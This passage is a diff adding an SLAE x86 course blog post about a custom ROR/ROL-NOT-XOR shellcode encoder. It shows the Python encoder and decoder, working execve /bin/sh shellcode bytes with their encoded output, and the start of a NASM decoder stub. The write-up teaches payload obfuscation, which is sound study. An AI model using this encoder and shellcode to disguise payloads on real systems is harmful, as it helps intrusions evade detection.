@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>SLAE x86 Exam - Assignment #4</title>
+    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
+    <link rel="canonical" href="/21/12/21/slae32-assignment-4">
+    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />
+
+    <style>
+         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
+    </style>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <a href="/">RBCT</a>
+
+    <nav class="group">
+        
+            
+        
+            
+                
+                <a href="/">POSTS</a>
+                
+            
+        
+            
+                
+                <a href="/about/">ABOUT</a>
+                
+            
+        
+    </nav>
+</header>
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <h1>SLAE x86 Exam - Assignment #4</h1>
+
+        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
+            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
+            <span class="mono authors">
+                <a href="/author/rbct" itemprop="name">rbct</a>
+            </span>
+        </div>
+
+        <time class="mono" datetime="2021-12-21T00:00:00+01:00" itemProp="datePublished">
+            21 December 2021
+        </time>
+
+        <hr>
+        <main itemprop="articleBody" style="position: relative;">
+            <h2 id="disclaimer">Disclaimer</h2>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: PA-30398</p>
+<h2 id="foreword">Foreword</h2>
+<p>The 4th assignment requires you to write a custom encoding scheme. The <code>PoC</code> ought to encode the <code>execve-stack</code> shellcode and execute it.</p>
+<h2 id="source-code">Source Code</h2>
+<p>For this assignment, I uploaded the following files inside the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/4">assignment/4</a>:</p>
+<ul>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py">encoder.py</a>: Python encoder using ROR/ROL-NOT-XOR instructions</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm">decoder.nasm</a>: Assembly decoder for the encoder above</li>
+</ul>
+<h2 id="encoding-scheme">Encoding Scheme</h2>
+<p>I tried to think of an encoder that uses just a few mathematical operations and that's not too obvious like XOR encoders.</p>
+<p>My implementation looks like this:</p>
+<ol>
+<li>rotate:
+<ol>
+<li>even-index bytes <code>ROT_EVEN</code> times using ROR (Right Rotation)</li>
+<li>odd-index bytes <code>ROT_ODD</code> times using ROL (Left Rotation)</li>
+</ol>
+</li>
+<li>invert (<code>NOT</code>) each byte</li>
+<li>XOR each byte with the least significant byte of the length of the shellcode (<code>SHELL_CODE_LENGTH</code>, made up of 2 bytes)</li>
+</ol>
+<p>The encoded shellcode (with the prepended auxiliary bytes) should look like this:</p>
+<p><img src="/assets/img/slae32/encoded_shellcode.png" alt="Visual representation of the encoded shellcode" />
+<em>Visual representation of the encoded shellcode</em></p>
+<h2 id="python-encoder">Python Encoder</h2>
+<p>Follows the python code that reads the shellcode stored inside <code>--input</code>, encodes it according to the previous scheme, and saves it into <code>--output</code>:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-i"</span><span class="p">,</span> <span class="s">"--input"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"File containing shellcode to encode"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-o"</span><span class="p">,</span> <span class="s">"--output"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Store the encoded shellcode in this file"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">input_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="nb">input</span>
+    <span class="n">output_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span>
+
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">read_shellcode</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
+    <span class="n">encoded_shellcode</span> <span class="o">=</span> <span class="n">manage_shellcode_encoding</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">)</span>
+
+    <span class="k">assert</span> <span class="n">shellcode</span> <span class="o">==</span> <span class="n">manage_shellcode_decoding</span><span class="p">(</span><span class="n">encoded_shellcode</span><span class="p">)</span>
+</code></pre></div></div>
+<p><sub class='aside'>After the shellcode is encoded, the program <code>asserts</code> whether the decoded version is correct
+</sub></p>
+<p>Follows the encoding function:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encode_shellcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="n">encoded_shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Original non-encoded shellcode (HEX): </span><span class="si">{</span><span class="n">shellcode</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">shellcode_length_least_byte</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+    <span class="n">shellcode_length_most_byte</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">//</span> <span class="mi">256</span>
+
+    <span class="n">ROT_EVEN</span><span class="p">,</span> <span class="n">ROT_ODD</span> <span class="o">=</span> <span class="n">gen_random_rotations</span><span class="p">(</span><span class="n">ms_byte</span><span class="o">=</span><span class="n">shellcode_length_most_byte</span><span class="p">,</span> <span class="n">ls_byte</span><span class="o">=</span><span class="n">shellcode_length_least_byte</span><span class="p">)</span>
+    <span class="n">shellcode_length_least_byte</span> <span class="o">=</span> <span class="n">shellcode_length_least_byte</span> <span class="o">^</span> <span class="n">ROT_EVEN</span>
+    <span class="n">shellcode_length_most_byte</span> <span class="o">=</span> <span class="n">shellcode_length_most_byte</span> <span class="o">^</span> <span class="n">ROT_ODD</span>
+</code></pre></div></div>
+<p><sub class='aside'>The Least/Most Significant Bytes are XOR-ed with <code>ROT_EVEN</code>/<code>ROT_ODD</code> in order to avoid <strong>null bytes</strong>, e.g. shellcode of 256 bytes -&gt; <code>0x0100</code>
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Rotations for even-index bytes: </span><span class="si">{</span><span class="n">ROT_EVEN</span><span class="si">}</span><span class="s"> (hex: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ROT_EVEN</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Rotations for odd-index bytes: </span><span class="si">{</span><span class="n">ROT_ODD</span><span class="si">}</span><span class="s"> (hex: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ROT_ODD</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: </span><span class="si">{</span><span class="n">shellcode_length_least_byte</span><span class="si">}</span><span class="s"> (hex: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellcode_length_least_byte</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: </span><span class="si">{</span><span class="n">shellcode_length_most_byte</span><span class="si">}</span><span class="s"> (hex: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellcode_length_most_byte</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+
+    <span class="n">encoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ROT_EVEN</span><span class="p">)</span>
+    <span class="n">encoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ROT_ODD</span><span class="p">)</span>
+    <span class="n">encoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_length_least_byte</span><span class="p">)</span>
+    <span class="n">encoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_length_most_byte</span><span class="p">)</span>
+</code></pre></div></div>
+<p><sub class='aside'>Some auxialiary bytes are prepended to the encoded shellcode, in order for the decoder stub to decode it
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Helper bytes for decoding (HEX): </span><span class="si">{</span><span class="n">encoded_shellcode</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># 1. Rotate bytes
+</span>    <span class="c1">#   1.1. EVEN index -&gt; Rotate to the Right ROT_EVEN times
+</span>    <span class="c1">#   1.2. ODD index -&gt; Rotate to the Left ROT_ODD times
+</span>    <span class="c1"># 2. NOT each byte
+</span>    <span class="c1"># 3. XOR each byte with the Least Significant Byte of the shellcode length
+</span>    <span class="c1">#   (shellcode_length_least_byte), which is XOR-ed with ROT_EVEN to avoid null_bytes
+</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[#] Encoding ..."</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="c1"># even index byte
+</span>            <span class="c1"># print(f"[+] EVEN | Original byte: {hex(byte)}")
+</span>
+            <span class="n">encoded_byte</span> <span class="o">=</span> <span class="n">bitwise_ror</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="n">ROT_EVEN</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+            <span class="c1"># print(f"[+] EVEN | Rotated byte: {hex(encoded_byte)}")
+</span>
+            <span class="n">encoded_byte</span> <span class="o">=</span> <span class="n">bitwise_not</span><span class="p">(</span><span class="n">encoded_byte</span><span class="p">)</span>
+            <span class="c1"># print(f"[+] EVEN | NOT-ed byte: {hex(encoded_byte)}")
+</span></code></pre></div></div>
+<p><sub class='aside'>ROR/ROL functions are taken from <a href="https://www.falatic.com/index.php/108/python-and-bitwise-rotation">Technological Masochism</a>
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if</span> <span class="n">shellcode_length_least_byte</span> <span class="o">!=</span> <span class="n">encoded_byte</span><span class="p">:</span>
+                <span class="n">encoded_byte</span> <span class="o">^=</span> <span class="n">shellcode_length_least_byte</span>
+                <span class="c1"># print(f"[+] EVEN | Xored byte: {hex(encoded_byte)}\n")
+</span></code></pre></div></div>
+<p><sub class='aside'>Avoid XOR-ing bytes equal to <code>shellcode_length_least_byte</code>, as it would result in <code>NULL</code> bytes
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># odd index byte
+</span>            <span class="c1"># print(f"[+] ODD | Original byte: {hex(byte)}")
+</span>
+            <span class="n">encoded_byte</span> <span class="o">=</span> <span class="n">bitwise_rol</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="n">ROT_ODD</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+            <span class="c1"># print(f"[+] ODD | Rotated byte: {hex(encoded_byte)}")
+</span>
+            <span class="n">encoded_byte</span> <span class="o">=</span> <span class="n">bitwise_not</span><span class="p">(</span><span class="n">encoded_byte</span><span class="p">)</span>
+            <span class="c1"># print(f"[+] ODD | NOT-ed byte: {hex(encoded_byte)}")
+</span>
+            <span class="k">if</span> <span class="n">shellcode_length_least_byte</span> <span class="o">!=</span> <span class="n">encoded_byte</span><span class="p">:</span>
+                <span class="n">encoded_byte</span> <span class="o">^=</span> <span class="n">shellcode_length_least_byte</span>
+                <span class="c1"># print(f"[+] ODD | Xored byte: {hex(encoded_byte)}\n")
+</span>        
+        <span class="n">encoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">encoded_byte</span><span class="p">)</span>
+</code></pre></div></div>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">assert</span> <span class="mh">0x00</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">encoded_shellcode</span>
+    <span class="k">return</span> <span class="n">encoded_shellcode</span>
+</code></pre></div></div>
+<p><sub class='aside'>The program fails if <code>NULL</code> bytes are present in the encoded shellcode
+</sub></p>
+<p>I ran the script multiple times with larger shellcodes, so I'm pretty sure (like ~98%) that the encoded shellcode won't contain <code>NULL</code> bytes.</p>
+<p>The full script is stored on GitHub at <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py">rbctee/SlaeExam</a>.</p>
+<h2 id="python-decoder">Python Decoder</h2>
+<p>Inside the previous <code>python</code> script I also implemented a function that decodes the encoded shellcode:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decode_shellcode</span><span class="p">(</span><span class="n">encoded_shellcode</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="n">decoded_shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+
+    <span class="n">ROT_EVEN</span><span class="p">,</span> <span class="n">ROT_ODD</span> <span class="o">=</span> <span class="n">encoded_shellcode</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">shellcode_length_least_byte</span> <span class="o">=</span> <span class="n">encoded_shellcode</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">shellcode_length_most_byte</span> <span class="o">=</span> <span class="n">encoded_shellcode</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">encoded_shellcode_main</span> <span class="o">=</span> <span class="n">encoded_shellcode</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+</code></pre></div></div>
+<p><sub class='aside'>Extract the <strong>auxiliary bytes</strong> prepended to the encoded shellcode
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[#] Decoding ..."</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">encoded_byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">encoded_shellcode_main</span><span class="p">):</span>
+
+        <span class="k">if</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">encoded_byte</span> <span class="o">!=</span> <span class="n">shellcode_length_least_byte</span><span class="p">:</span>
+            	<span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">encoded_byte</span> <span class="o">^</span> <span class="n">shellcode_length_least_byte</span>
+</code></pre></div></div>
+<p><sub class='aside'>Check if the index is <code>odd</code>/<code>even</code>. Moreover, if the encoded byte is equal to the <code>Least Significant Byte</code> of the shellcode's length, then ignore it
+</sub></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">else</span><span class="p">:</span>
+            	<span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">encoded_byte</span>
+
+            <span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">bitwise_not</span><span class="p">(</span><span class="n">decoded_byte</span><span class="p">)</span>
+            <span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">bitwise_rol</span><span class="p">(</span><span class="n">decoded_byte</span><span class="p">,</span> <span class="n">ROT_EVEN</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">encoded_byte</span> <span class="o">!=</span> <span class="n">shellcode_length_least_byte</span><span class="p">:</span>
+            	<span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">encoded_byte</span> <span class="o">^</span> <span class="n">shellcode_length_least_byte</span>
+            <span class="k">else</span><span class="p">:</span>
+            	<span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">encoded_byte</span>
+
+            <span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">bitwise_not</span><span class="p">(</span><span class="n">decoded_byte</span><span class="p">)</span>
+            <span class="n">decoded_byte</span> <span class="o">=</span> <span class="n">bitwise_ror</span><span class="p">(</span><span class="n">decoded_byte</span><span class="p">,</span> <span class="n">ROT_ODD</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+
+        <span class="n">decoded_shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decoded_byte</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Decoded shellcode (HEX): </span><span class="si">{</span><span class="n">decoded_shellcode</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">decoded_shellcode</span>
+</code></pre></div></div>
+<p>For every byte of the encoded shellcode, the function does the following:</p>
+<ol>
+<li><code>XOR</code> each byte with the value of <code>shellcode_length_least_byte</code>, made exception for bytes equal to it</li>
+<li><code>NOT</code> each byte</li>
+<li>Rotate bytes</li>
+</ol>
+<ul>
+<li>if the index of the byte is <code>even</code>, then rotate to the left (<code>ROL</code>) <code>ROT_EVEN</code> times</li>
+<li>if the index of the byte is <code>odd</code>, then rotate to the right (<code>ROR</code>) <code>ROT_ODD</code> times</li>
+</ul>
+<p>Once you execute the script, it shows how to use it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 encoder.py <span class="nt">-h</span>
+
+<span class="c"># usage: encoder.py [-h] -i INPUT [-o OUTPUT]</span>
+
+<span class="c"># optional arguments:</span>
+<span class="c">#   -h, --help            show this help message and exit</span>
+<span class="c">#   -i INPUT, --input INPUT</span>
+<span class="c">#                         File containing shellcode to encode</span>
+<span class="c">#   -o OUTPUT, --output OUTPUT</span>
+<span class="c">#                         Store the encoded shellcode in this file</span>
+</code></pre></div></div>
+<p>If you pass the correct arguments, in encodes your shellcode and <em>asserts</em> that it can be decoded correctly:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span> <span class="o">&gt;</span> shellcode.bin
+
+python3 encoder.py <span class="nt">-i</span> ./shellcode.bin <span class="nt">-o</span> /tmp/encoded.binc
+
+<span class="c"># [+] Non-encoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a</span>
+<span class="c"># [+] Non-encoded shellcode length: 28 bytes</span>
+<span class="c"># [+] Rotations for even-index bytes: 2 (hex: 0x2)</span>
+<span class="c"># [+] Rotations for odd-index bytes: 168 (hex: 0xa8)</span>
+<span class="c"># [+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: 30 (hex: 0x1e)</span>
+<span class="c"># [+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: 168 (hex: 0xa8)</span>
+<span class="c"># [+] Helper bytes for decoding (HEX): 02a81ea8</span>
+
+<span class="c"># [#] Encoding ...</span>
+<span class="c"># [+] Encoded shellcode (HEX): 02a81ea8ad21f5897ace3d89fbce2a83bb512368196cf2c5e36cf4c5e32cc1eb</span>
+<span class="c"># [+] Encoded shellcode length: 32 bytes</span>
+<span class="c"># [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb</span>
+
+<span class="c"># [#] Decoding ...</span>
+<span class="c"># [+] Decoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a</span>
+</code></pre></div></div>
+<p>The line starting with <strong>Assembly data:</strong> contains the bytes you can copy-paste into the NASM skeleton file and use them with the <code>JMP-CALL-POP</code> technique:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb</span>
+</code></pre></div></div>
+<h2 id="assembly-decoder">Assembly Decoder</h2>
+<p>First step is to prepare the skeleton of the decoder. I used the same shown in the <code>Episode 31</code> of the course, employed in conjunction with the <code>Insertion</code> encoder:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Author: Robert C. Raducioiu (rbct)</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="nf">xor</span> <span class="nb">ebx</span>
